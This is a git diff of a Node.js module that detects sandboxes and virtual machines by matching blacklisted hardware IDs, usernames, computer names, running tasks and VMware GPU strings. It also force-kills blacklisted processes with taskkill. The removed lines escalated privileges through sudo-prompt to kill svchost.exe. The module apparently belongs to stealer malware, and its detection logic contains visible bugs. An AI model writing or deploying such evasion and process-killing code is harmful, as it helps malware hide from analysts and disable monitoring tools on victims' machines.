@@ -1,7 +1,5 @@
 const { execSync } = require('child_process');
 const os = require('os');
-const psList = () => import('ps-list').then(({ default: psList }) => psList());
-const sudo = require('sudo-prompt');
 
 const blacklistedHWIDs = [
   '7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009',
@@ -47,6 +45,13 @@ const checkUsers = () => {
   return os.userInfo().username.toLowerCase() in blacklistedUsers;
 };
 
+const checkTasks = () => {
+  const tasks = execSync('tasklist');
+  let detected = false;
+  blacklistedTasks.forEach((task) => { detected = tasks.includes(task); });
+  return detected;
+};
+
 const checkRegistry = () => {
   const gpuCheck =
     execSync('wmic path win32_VideoController get name').toString().toLowerCase().includes('vmware') ||
@@ -55,29 +60,14 @@ const checkRegistry = () => {
 };
 
 const killTasks = () => {
-  return psList().then(data => {
-    const sysProcess = data.find(p => p.name === 'svchost.exe');
-    if (typeof sysProcess !== 'undefined') {
-      process.on('uncaughtException', err => {
-        // If we can't kill the process without using administrator rights, we
-        // need to use these to kill the process
-        if (err.message === 'kill EPERM') {
-          let cmd;
-          // eslint-disable-next-line indent
-               if (process.platform === 'win32') cmd = 'taskkill /f /im';
-          else if (process.platform === 'linux') cmd = 'killall';
-          else cmd = 'kill';
-          sudo.exec(`${cmd} ${sysProcess?.name}`, { name: require('../config').name }, () => {});
-        }
-      });
-      process.kill(sysProcess.pid);
-    }
+  const tasks = execSync('tasklist');
+  blacklistedTasks.forEach((task) => {
+    if (tasks.includes(task)) execSync(`taskkill /f /im ${task}.exe`);
   });
 };
 
 const checkVM = () => {
-  return checkHWID() || checkComputerName() || checkUsers() || checkRegistry();
+  return checkHWID() || checkComputerName() || checkUsers() || checkTasks() || checkRegistry();
 };
 
-module.exports.checkVM = checkVM;
-module.exports.killTasks = killTasks;
+module.exports = { checkVM, killTasks };
